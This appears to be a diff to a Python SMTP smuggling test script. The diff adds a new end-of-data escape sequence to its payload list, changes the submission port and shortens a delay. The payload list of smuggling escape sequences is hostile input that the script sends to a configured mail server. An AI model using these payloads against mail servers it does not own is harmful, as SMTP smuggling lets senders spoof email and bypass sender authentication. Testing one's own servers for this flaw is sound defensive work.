@@ -29,7 +29,7 @@ import smtplib
 
 
 #
-# GLOBASL VARS AND SETTINGS:
+# GLOBAL VARS AND SETTINGS:
 # --------------------------
 email_subject = 'Subject: Your Subject'
 email_body_one = 'Here is the text of your email'
@@ -37,8 +37,9 @@ admin_from = 'admin@mailserver.com'
 end_of_data_command = '\r\n.\r\n'
 
 
-#Smgggling Strings (0-10):
+#Smgggling Strings (0-11):
 #smtp_smuggle_escape = \r\n.\r
+#smtp_smuggle_escape = \r.\r
 #smtp_smuggle_escape = '\r\n\x00.\r'
 #smtp_smuggle_escape = '\r\n\x00.\n'
 #smtp_smuggle_escape = \r\n\x00.\r\n
@@ -53,6 +54,7 @@ end_of_data_command = '\r\n.\r\n'
 smtp_test_nr = 0
 smtp_smuggle_escapes = [
     '\r\n.\r',
+    '\r.\r',
     '\r\n\x00.\r',
     '\r\n\x00.\n',
     '\r\n\x00.\r\n',
@@ -330,8 +332,8 @@ def main():
     # Server and Port of (local) Postfix-Servers
     #sserver = '127.0.0.1'
     sserver = 'mail.servername.com'
-    sport = 25
-    #sport = 587
+    #sport = 25
+    sport = 587
 
     susername = 'info@severname.com'
     spassword = 'CHANGE_ME'
@@ -359,7 +361,7 @@ def main():
 
     for es in smtp_smuggle_escapes:
         print(f'\n  -----\n[*] Trying with smuggle escape payload: ({repr(es)})\n  -----\n')
-        time.sleep(1.6)
+        time.sleep(1.4)
 
         if args.mode == 'def':
             try:
